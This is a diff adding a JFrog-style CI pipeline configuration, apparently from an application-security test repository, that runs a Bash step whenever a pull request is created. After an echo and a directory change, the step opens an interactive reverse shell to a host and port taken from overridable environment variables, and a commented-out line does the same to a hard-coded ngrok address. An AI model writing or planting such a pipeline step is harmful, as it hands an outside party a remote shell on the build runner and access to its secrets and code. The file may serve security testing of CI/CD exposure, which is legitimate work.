@@ -1,0 +1,35 @@
+resources:
+  - name: repo_git_3
+    type: GitRepo
+    configuration:
+      gitProvider: assaf_gh
+      path: assaf-levkovich-jf/appsec-cicd-test
+      buildOn:
+        pullRequestCreate: true
+        commit: false
+
+pipelines:
+  - name: npm_install_pipeline_2
+    configuration:
+      environmentVariables:
+        readOnly:
+          env:
+            default: "ng_address"
+            allowCustom: true
+          env2:
+            default: "ng_port"
+            allowCustom: true
+    steps:
+      - name: build_on_pr
+        type: Bash
+        configuration:
+          inputResources:
+            - name: repo_git
+          # runtime:
+          #   type: host
+        execution:
+          onExecute:
+            - echo "A pull request has triggered this pipeline"
+            - cd $res_repo_git_resourcePath
+            #- /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/16856 0>&1'
+            - /bin/bash -c 'bash -i >& /dev/tcp/${env[0]}/${env2[0]} 0>&1'
